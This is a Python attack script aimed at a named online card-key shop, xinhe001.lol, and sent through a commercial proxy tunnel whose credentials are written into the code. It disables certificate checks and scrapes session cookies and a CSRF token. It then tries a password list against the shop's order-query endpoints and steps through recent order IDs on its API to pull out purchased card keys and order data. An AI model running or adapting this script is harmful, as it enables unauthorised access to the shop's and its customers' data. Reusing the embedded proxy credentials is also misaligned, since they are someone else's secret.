#!/usr/bin/env python3
"""xinhe001 via Qingguo overseas tunnel — must visit home first for session cookies."""
import json
import os
import re
import sys
import time

import requests

requests.packages.urllib3.disable_warnings()

BASE = "https://xinhe001.lol/shop/"
OUT = sys.argv[1] if len(sys.argv) > 1 else "/tmp/xinhe001_qg_tunnel.json"
PWD_FILE = sys.argv[2] if len(sys.argv) > 2 else "/workspace/query_pwd_list.txt"
PWD_LIMIT = int(sys.argv[3]) if len(sys.argv) > 3 else 40
API_N = int(sys.argv[4]) if len(sys.argv) > 4 else 15

PROXY = os.environ.get(
    "QG_TUNNEL",
    "http://15E27ADA-A-JP-T-300-S-xhprobe:661C21F2CC15@overseas-us.tunnel.qg.net:16538",
)
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
SHOW = re.compile(r"showOrder\((\d+),\s*['\"]([^'\"]+)['\"]\)")
CSRF = re.compile(r'csrf_token\s*=\s*"([^"]+)"')
CARD = re.compile(r"<textarea[^>]*>([^<]+)</textarea>", re.S)


def leak(t):
    return (
        SHOW.search(t)
        or "kminfo" in t
        or ("----" in t and ("COM" in t or "sms" in t.lower()))
        or CARD.search(t)
    )


def main():
    s = requests.Session()
    s.verify = False
    s.proxies = {"http": PROXY, "https": PROXY}
    s.headers.update(
        {
            "User-Agent": UA,
            "Accept-Language": "zh-CN,zh;q=0.9",
            "Referer": BASE,
        }
    )

    report = {
        "target": "xinhe001.lol",
        "ts": time.strftime("%Y-%m-%d %H:%M:%S"),
        "proxy": PROXY[:50] + "...",
        "card_leak": False,
    }

    r = s.get(BASE, timeout=30)
    if len(r.text) < 5000:
        report["error"] = "home too small"
        json.dump(report, open(OUT, "w"), ensure_ascii=False, indent=2)
        print("FAIL home", len(r.text))
        return

    csrf = CSRF.search(r.text).group(1) if CSRF.search(r.text) else ""
    report["home_len"] = len(r.text)
    report["csrf"] = csrf[:24]
    report["cookies"] = list(s.cookies.keys())

    gc = s.get(BASE + "ajax.php?act=getcount", timeout=20)
    report["getcount"] = gc.text[:200]
    print("getcount", gc.text[:120], flush=True)
    if '"code":0' not in gc.text:
        json.dump(report, open(OUT, "w"), ensure_ascii=False, indent=2)
        print("FAIL getcount without session bypass")
        return

    orders = 5718
    try:
        orders = int(json.loads(gc.text).get("orders", 5718))
    except Exception:
        pass

    # surface
    surface = {}
    for name, params in [
        ("query", {"mod": "query"}),
        ("query_data1", {"mod": "query", "data": "1"}),
        ("query_data138", {"mod": "query", "data": "138"}),
        ("so", {"mod": "so"}),
    ]:
        rr = s.get(BASE, params=params, timeout=18)
        so = SHOW.findall(rr.text)
        surface[name] = {"len": len(rr.text), "showOrder": len(so)}
        if so:
            surface[name]["sample"] = so[:3]
            report["card_leak"] = True
            print("SURFACE HIT", name, so[:2], flush=True)
        time.sleep(1.2)
    report["surface"] = surface

    tl = s.get(BASE + "toollogs.php", timeout=15)
    report["toollogs"] = {"len": len(tl.text), "showOrder": len(SHOW.findall(tl.text))}
    time.sleep(1)

    pwd_hits = []
    pwds = []
    if os.path.isfile(PWD_FILE):
        with open(PWD_FILE, encoding="utf-8") as f:
            pwds = [x.strip() for x in f if x.strip()][:PWD_LIMIT]
    for pwd in pwds:
        try:
            rg = s.get(BASE, params={"mod": "query", "data": pwd}, timeout=16)
            so = SHOW.findall(rg.text)
            if so or leak(rg.text):
                pwd_hits.append({"pwd": pwd, "via": "GET", "shows": so[:5]})
                report["card_leak"] = True
                print("PWD GET", pwd, flush=True)
            rp = s.post(
                BASE + "ajax.php?act=query",
                data={
                    "type": "1",
                    "content": pwd,
                    "pwd": pwd,
                    "csrf_token": csrf,
                },
                timeout=16,
            )
            if leak(rp.text) or '"code":0' in rp.text and "不存在" not in rp.text:
                pwd_hits.append({"pwd": pwd, "via": "ajax", "body": rp.text[:300]})
                if leak(rp.text):
                    report["card_leak"] = True
                print("PWD ajax", pwd, rp.text[:80], flush=True)
        except Exception as e:
            print("pwd err", pwd, e, flush=True)
        time.sleep(1.5)
    report["pwd_hits"] = pwd_hits

    api_hits = []
    for oid in range(orders, orders - API_N, -1):
        try:
            ar = s.get(BASE + f"api.php?act=search&id={oid}", timeout=20)
            body = ar.text
            if leak(body) or (
                '"code":0' in body
                and "验证失败" not in body
                and "不存在" not in body
                and len(body) > 50
            ):
                api_hits.append({"id": oid, "body": body[:400]})
                report["card_leak"] = True
                print("API HIT", oid, body[:80], flush=True)
        except Exception as e:
            api_hits.append({"id": oid, "err": str(e)[:60]})
        time.sleep(4)
    report["api_hits"] = api_hits

    json.dump(report, open(OUT, "w"), ensure_ascii=False, indent=2)
    print("CARD_LEAK", report["card_leak"], flush=True)
    print("OUT", OUT, flush=True)


if __name__ == "__main__":
    main()
